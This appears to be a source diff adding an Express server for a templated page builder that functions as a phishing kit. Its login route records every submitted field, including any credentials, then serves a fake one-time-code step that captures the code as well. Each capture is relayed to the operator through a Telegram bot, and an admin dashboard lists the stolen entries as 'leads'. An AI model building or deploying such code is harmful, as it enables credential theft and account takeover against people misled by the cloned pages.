@@ -1,0 +1,335 @@
+import 'dotenv/config';
+import express from 'express';
+import session from 'express-session';
+import path from 'node:path';
+import { fileURLToPath } from 'node:url';
+import db from './db.js';
+import { bot, notify } from './bot.js';
+import { getTemplate, getCategories, getTemplatesByCategory } from './templates.js';
+import { generateOTP, generateCSRFToken, verifyCSRFToken, storeOTP, verifyOTP, checkThrottle } from './security.js';
+
+const __dirname = path.dirname(fileURLToPath(import.meta.url));
+const app = express();
+
+app.set('view engine', 'ejs');
+app.set('views', path.join(__dirname, 'views'));
+app.set('trust proxy', 1);
+app.use(express.urlencoded({ extended: true }));
+app.use(express.json());
+app.use(express.static(path.join(__dirname, '..', 'public')));
+
+app.use(session({
+  secret: process.env.SESSION_SECRET || 'dev-secret',
+  resave: false,
+  saveUninitialized: false,
+  cookie: { httpOnly: true, sameSite: 'lax', maxAge: 24 * 60 * 60 * 1000, secure: process.env.NODE_ENV === 'production' }
+}));
+
+// CSRF middleware
+app.use((req, res, next) => {
+  if (!req.session.csrfToken) {
+    req.session.csrfToken = generateCSRFToken();
+  }
+  res.locals.csrfToken = req.session.csrfToken;
+  next();
+});
+
+const isAdmin = (req, res, next) => req.session.admin ? next() : res.redirect('/admin/login');
+const slugify = s => String(s || '').trim().toLowerCase().replace(/\s+/g, '-').replace(/[^a-z0-9-]/g, '').replace(/-+/g, '-');
+const esc = s => String(s).replace(/[&<>"']/g, c => ({'&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'}[c]));
+
+// PUBLIC ROUTES
+app.get('/', (req, res) => res.redirect('/admin'));
+
+app.get('/p/:slug/:pageSlug?', (req, res) => {
+  try {
+    const { slug, pageSlug } = req.params;
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(slug);
+    if (!page) return res.status(404).send('الصفحة غير موجودة');
+
+    const tpl = getTemplate(page.template_id);
+    const defaultSlug = tpl.pages[0]?.slug || 'login';
+    const pageContent = tpl.pages.find(p => p.slug === (pageSlug || defaultSlug)) || tpl.pages[0];
+
+    db.prepare('UPDATE pages SET views = views + 1 WHERE id = ?').run(page.id);
+    const viewName = { auth: 'login', otp: 'otp', landing: 'landing', 'hero-center': 'landing', cards: 'landing' }[pageContent.layout] || 'landing';
+
+    res.render(viewName, { page, tpl, pageContent, allPages: tpl.pages, sent: !!req.query.sent, verified: !!req.query.verified });
+  } catch (err) {
+    console.error('Get page error:', err.message);
+    res.status(500).send('خطأ في تحميل الصفحة');
+  }
+});
+
+app.post('/p/:slug/login', async (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
+    if (!page) return res.status(404).send('not found');
+
+    // Throttle check
+    const throttle = checkThrottle(page.id, req.ip);
+    if (throttle.throttled) {
+      return res.status(429).json({ error: `تم تجاوز المحاولات. حاول بعد ${throttle.retryAfter} ثانية` });
+    }
+
+    const tpl = getTemplate(page.template_id);
+    db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
+      .run(page.id, JSON.stringify({ step: 'login', ...req.body }), req.ip, req.get('user-agent') || '');
+
+    const code = generateOTP(6);
+    storeOTP(page.id, req.ip, code);
+    console.log(`✅ OTP generated for ${req.params.slug}: ${code}`);
+
+    const lines = Object.entries(req.body)
+      .filter(([k]) => !['_hp', 'remember', '_csrf'].includes(k))
+      .map(([k, v]) => `<b>${esc(k)}</b>: ${esc(v)}`).join('\n');
+
+    await notify(`🔐 <b>Login Step</b>\n📄 <b>${esc(tpl.name)}</b>\n\n${lines}`);
+    res.redirect(`/p/${page.slug}/verify`);
+  } catch (err) {
+    console.error('Login error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.post('/p/:slug/verify', async (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
+    if (!page) return res.status(404).send('not found');
+
+    const tpl = getTemplate(page.template_id);
+    const result = verifyOTP(page.id, req.ip, req.body.code);
+    if (!result.valid) {
+      return res.status(400).json({ error: `كود غلط: ${result.reason}` });
+    }
+
+    db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
+      .run(page.id, JSON.stringify({ step: 'otp', ...req.body }), req.ip, req.get('user-agent') || '');
+
+    const lines = Object.entries(req.body)
+      .filter(([k]) => k !== '_csrf')
+      .map(([k, v]) => `<b>${k}</b>: <code>${esc(v)}</code>`).join('\n');
+
+    await notify(`🔢 <b>OTP Step</b>\n📄 <b>${esc(tpl.name)}</b>\n\n${lines}`);
+    res.redirect(`/p/${page.slug}/home?verified=1`);
+  } catch (err) {
+    console.error('OTP verify error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.post('/p/:slug/resend-otp', (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ?').get(req.params.slug);
+    if (!page) return res.status(404).json({ error: 'not found' });
+
+    const code = generateOTP(6);
+    storeOTP(page.id, req.ip, code);
+    console.log(`OTP for ${req.params.slug}: ${code}`);
+    res.json({ ok: true, message: 'تم إعادة إرسال الكود' });
+  } catch (err) {
+    console.error('Resend OTP error:', err.message);
+    res.status(500).json({ error: 'خطأ' });
+  }
+});
+
+app.post('/p/:slug/submit', async (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE slug = ? AND active = 1').get(req.params.slug);
+    if (!page) return res.status(404).send('not found');
+    if (req.body._hp) return res.json({ ok: true });
+
+    const allowed = JSON.parse(page.fields);
+    const data = {};
+    for (const f of allowed) {
+      if (req.body[f] != null) {
+        data[f] = String(req.body[f]).slice(0, 500);
+      }
+    }
+
+    const info = db.prepare('INSERT INTO leads (page_id, data, ip, ua) VALUES (?,?,?,?)')
+      .run(page.id, JSON.stringify(data), req.ip, req.get('user-agent') || '');
+
+    const lines = Object.entries(data).map(([k, v]) => `<b>${esc(k)}</b>: ${esc(v)}`).join('\n');
+    await notify(`🔔 <b>New Lead</b>\n📄 ${esc(page.title)}\n${lines}\n\n#lead_${info.lastInsertRowid}`);
+
+    if (req.headers.accept?.includes('application/json')) return res.json({ ok: true });
+    res.redirect(`/p/${page.slug}/home?sent=1`);
+  } catch (err) {
+    console.error('Submit error:', err.message);
+    res.status(500).json({ error: 'خطأ' });
+  }
+});
+
+// ADMIN AUTH
+app.get('/admin/login', (req, res) => res.render('admin_login', { error: null }));
+
+app.post('/admin/login', (req, res) => {
+  if (req.body.password === process.env.ADMIN_PASSWORD) {
+    req.session.admin = true;
+    return res.redirect('/admin');
+  }
+  res.render('admin_login', { error: 'كلمة السر غلط' });
+});
+
+app.post('/admin/logout', (req, res) => req.session.destroy(() => res.redirect('/admin/login')));
+
+// ADMIN DASHBOARD
+app.get('/admin', isAdmin, (req, res) => {
+  try {
+    const page = parseInt(req.query.page) || 1;
+    const limit = 10;
+    const offset = (page - 1) * limit;
+
+    const pages = db.prepare(`
+      SELECT p.*, (SELECT COUNT(*) FROM leads l WHERE l.page_id = p.id) AS leads_count
+      FROM pages p ORDER BY p.id DESC LIMIT ? OFFSET ?
+    `).all(limit, offset);
+
+    const total = db.prepare('SELECT COUNT(*) c FROM pages').get().c;
+    const totalPages = Math.ceil(total / limit);
+
+    pages.forEach(p => { p.template_name = getTemplate(p.template_id).name; });
+
+    const totals = {
+      pages: total,
+      leads: db.prepare('SELECT COUNT(*) c FROM leads').get().c,
+      views: db.prepare('SELECT COALESCE(SUM(views),0) v FROM pages').get().v
+    };
+
+    res.render('dashboard', {
+      pages, totals, currentPage: page, totalPages,
+      hasPrev: page > 1, hasNext: page < totalPages
+    });
+  } catch (err) {
+    console.error('Dashboard error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.get('/admin/templates', isAdmin, (req, res) => {
+  try {
+    const cat = req.query.cat || null;
+    const list = getTemplatesByCategory(cat);
+    res.render('templates', {
+      templates: list,
+      categories: getCategories(),
+      activeCat: cat,
+      pageId: req.query.page_id || null
+    });
+  } catch (err) {
+    console.error('Templates error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.get('/admin/pages/new', isAdmin, (req, res) => {
+  try {
+    const tplId = req.query.template || 't001';
+    res.render('edit', {
+      page: {
+        id: null, slug: '', title: '', headline: '', subheadline: '', body: '',
+        button_text: 'سجل الآن', fields: '["name","phone"]',
+        theme: 'dark', pixel: '', active: 1, template_id: tplId
+      },
+      error: null
+    });
+  } catch (err) {
+    console.error('New page error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.post('/admin/pages', isAdmin, (req, res) => {
+  try {
+    const b = req.body;
+    let fields;
+    try { fields = JSON.stringify(JSON.parse(b.fields)); } catch { fields = '["name","email","phone"]'; }
+    db.prepare(`
+      INSERT INTO pages (slug,title,headline,subheadline,body,button_text,fields,theme,pixel,active,template_id)
+      VALUES (?,?,?,?,?,?,?,?,?,?,?)
+    `).run(slugify(b.slug), b.title, b.headline || '', b.subheadline || '', b.body || '',
+      b.button_text || 'سجل الآن', fields,
+      b.theme || 'dark', b.pixel || '', b.active ? 1 : 0, b.template_id || 't001');
+    res.redirect('/admin');
+  } catch (err) {
+    console.error('Create page error:', err.message);
+    res.render('edit', { page: { ...req.body, id: null }, error: err.message });
+  }
+});
+
+app.get('/admin/pages/:id', isAdmin, (req, res) => {
+  try {
+    const page = db.prepare('SELECT * FROM pages WHERE id = ?').get(req.params.id);
+    if (!page) return res.status(404).send('not found');
+    const leads = db.prepare('SELECT * FROM leads WHERE page_id = ? ORDER BY id DESC LIMIT 50').all(page.id);
+    page.template_name = getTemplate(page.template_id).name;
+    res.render('page_detail', { page, leads });
+  } catch (err) {
+    console.error('Page detail error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.post('/admin/pages/:id', isAdmin, (req, res) => {
+  try {
+    const b = req.body;
+    let fields;
+    try { fields = JSON.stringify(JSON.parse(b.fields)); } catch { fields = '["name","email","phone"]'; }
+    db.prepare(`
+      UPDATE pages SET slug=?,title=?,headline=?,subheadline=?,body=?,button_text=?,fields=?,theme=?,pixel=?,active=?,template_id=?
+      WHERE id=?
+    `).run(slugify(b.slug), b.title, b.headline || '', b.subheadline || '', b.body || '',
+      b.button_text || 'سجل الآن', fields,
+      b.theme || 'dark', b.pixel || '', b.active ? 1 : 0, b.template_id || 't001', req.params.id);
+    res.redirect('/admin/pages/' + req.params.id);
+  } catch (err) {
+    console.error('Update page error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+app.get('/admin/pages/:id/apply-template/:tplId', isAdmin, (req, res) => {
+  try {
+    db.prepare('UPDATE pages SET template_id=? WHERE id=?').run(req.params.tplId, req.params.id);
+    res.redirect('/admin/pages/' + req.params.id);
+  } catch (err) {
+    res.status(500).send('خطأ');
+  }
+});
+
+app.post('/admin/pages/:id/delete', isAdmin, (req, res) => {
+  try {
+    db.prepare('DELETE FROM pages WHERE id = ?').run(req.params.id);
+    res.redirect('/admin');
+  } catch (err) {
+    console.error('Delete page error:', err.message);
+    res.status(500).send('خطأ');
+  }
+});
+
+// BOT
+if (bot) {
+  const secret = process.env.WEBHOOK_SECRET;
+  if (process.env.BASE_URL?.startsWith('https') && secret) {
+    app.use(bot.webhookCallback('/telegram/webhook'));
+    bot.telegram.setWebhook(`${process.env.BASE_URL}/telegram/webhook`, { secret_token: secret })
+      .then(() => console.log('✅ webhook set'))
+      .catch(e => console.error('webhook error:', e.message));
+  } else {
+    bot.launch()
+      .then(() => console.log('🤖 bot polling started'))
+      .catch(e => console.error('bot launch error:', e.message));
+  }
+}
+
+const server = app.listen(process.env.PORT || 3000, () => {
+  console.log(`\n🌐 http://localhost:${process.env.PORT || 3000}`);
+  console.log(`📄 Admin: http://localhost:${process.env.PORT || 3000}/admin`);
+  console.log(`🔐 Password: ${process.env.ADMIN_PASSWORD}\n`);
+});
+
+process.once('SIGINT', () => { bot?.stop('SIGINT'); server.close(); });
+process.once('SIGTERM', () => { bot?.stop('SIGTERM'); server.close(); });
+
+export default app;
